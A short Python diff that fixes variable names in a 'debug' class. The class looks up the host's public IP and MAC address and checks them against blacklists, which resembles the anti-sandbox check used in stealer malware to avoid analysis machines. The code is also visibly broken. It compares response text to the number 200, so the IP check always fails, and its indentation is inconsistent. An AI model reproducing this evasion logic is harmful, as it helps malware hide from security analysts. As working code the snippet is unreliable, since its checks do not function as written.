@@ -562,8 +562,8 @@ class debug:
 		ip_address = requests.get('https://api.ipify.org').text
 		if ip_address != 200:
 			ip_address = "error"
-	mad = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        if ip in self.blackListedIPS: return True	
+	mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        if ip_address in self.blackListedIPS: return True	
         if mac in self.blackListedMacs: return True
         
     def get_system(self):
